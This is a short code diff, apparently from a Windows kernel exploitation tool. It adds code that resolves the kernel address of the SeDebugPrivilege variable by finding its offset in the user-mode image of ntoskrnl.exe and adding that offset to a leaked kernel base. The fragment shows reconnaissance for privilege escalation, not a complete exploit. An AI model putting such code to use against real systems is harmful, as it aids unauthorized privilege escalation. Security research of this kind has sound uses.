@@ -5,6 +5,8 @@
 
 DWORD64 NTOKernelBase;
 HMODULE NTOUserBase;
+DWORD64 SeDebugPrivilegeAddr;
+DWORD64 SeDebugPrivilegeAddrOffset;
 
 int main()
 {
@@ -28,6 +30,12 @@ int main()
     printf("[+] ntoskrnl kernel base: %llx\n", NTOKernelBase);
     NTOUserBase = GetModuleByName(wNtoPath);
     printf("[+] ntoskrnl user base: %llx\n", (DWORD64)NTOUserBase);
+
+    SeDebugPrivilegeAddrOffset = FindSeDebugPrivilegeOffset(NTOUserBase);
+    printf("[+] SeDebugPrivilege offset: %llx\n", SeDebugPrivilegeAddrOffset);
+
+    SeDebugPrivilegeAddr = NTOKernelBase + SeDebugPrivilegeAddrOffset;
+    printf("[+] SeDebugPrivilege: %llx\n", SeDebugPrivilegeAddr);
 
 
     LPCSTR NtoPath = "\\SystemRoot\\system32\\ntoskrnl.exe";
